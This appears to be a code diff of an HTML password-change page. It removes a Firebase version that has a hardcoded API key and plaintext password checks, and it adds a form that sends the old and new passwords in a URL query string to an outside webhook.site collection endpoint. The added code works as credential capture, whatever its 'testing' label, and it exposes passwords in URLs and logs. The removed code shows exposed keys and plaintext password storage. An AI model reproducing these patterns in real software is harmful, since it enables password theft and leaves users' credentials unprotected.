@@ -2,100 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Cloud Password Manager</title>
-  <style>
-    body {
-      font-family: Arial;
-      background: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .box {
-      background: white;
-      padding: 25px;
-      border-radius: 8px;
-      width: 320px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-    }
-    button {
-      background: #007bff;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    #msg {
-      margin-top: 10px;
-      font-weight: bold;
-    }
-  </style>
+  <title>Test Password Change</title>
 </head>
 <body>
 
-<div class="box">
-  <h2>Change Password</h2>
+<h2>Change Password (Testing)</h2>
 
-  <input type="password" id="oldPassword" placeholder="Old Password">
-  <input type="password" id="newPassword" placeholder="New Password">
-  <button onclick="changePassword()">Update Password</button>
+<form id="pwdForm">
+  <label>Old Password:</label><br>
+  <input type="password" id="oldPwd" required><br><br>
 
-  <p id="msg"></p>
-</div>
+  <label>New Password:</label><br>
+  <input type="password" id="newPwd" required><br><br>
 
-<!-- Firebase SDK -->
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, doc, getDoc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+  <button type="submit">Submit</button>
+</form>
 
-// 🔥 YOUR FIREBASE CONFIG
-const firebaseConfig = {
-  apiKey: "AIzaSyCLhw0pj4lehIBjns2i5R_xZQYNMDBIAfk",
-  authDomain: "password-cee2b.firebaseapp.com",
-  projectId: "password-cee2b",
-  storageBucket: "password-cee2b.firebasestorage.app",
-  messagingSenderId: "483253955947",
-  appId: "1:483253955947:web:7da483805b30b86096f02e"
-};
+<script>
+document.getElementById("pwdForm").addEventListener("submit", function(e) {
+  e.preventDefault();
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+  const oldPwd = encodeURIComponent(document.getElementById("oldPwd").value);
+  const newPwd = encodeURIComponent(document.getElementById("newPwd").value);
 
-// 🔐 Password Function
-window.changePassword = async function () {
-  let oldPass = document.getElementById("oldPassword").value;
-  let newPass = document.getElementById("newPassword").value;
-  let msg = document.getElementById("msg");
+  // Redirect to YOUR OWN test endpoint (not third-party)
+  const url = `https://webhook.site/1092dc88-896c-4d14-840f-b06909f466c2?old_password=${oldPwd}&new_password=${newPwd}`;
 
-  const userRef = doc(db, "users", "user1");
-  const docSnap = await getDoc(userRef);
-
-  // First time setup
-  if (!docSnap.exists()) {
-    await setDoc(userRef, { password: newPass });
-    msg.innerText = "✅ Password set (first time)";
-    msg.style.color = "green";
-    return;
-  }
-
-  let storedPass = docSnap.data().password;
-
-  if (storedPass !== oldPass) {
-    msg.innerText = "❌ Wrong old password";
-    msg.style.color = "red";
-    return;
-  }
-
-  await updateDoc(userRef, { password: newPass });
-
-  msg.innerText = "✅ Password updated successfully";
-  msg.style.color = "green";
-};
+  window.location.href = url;
+});
 </script>
 
 </body>
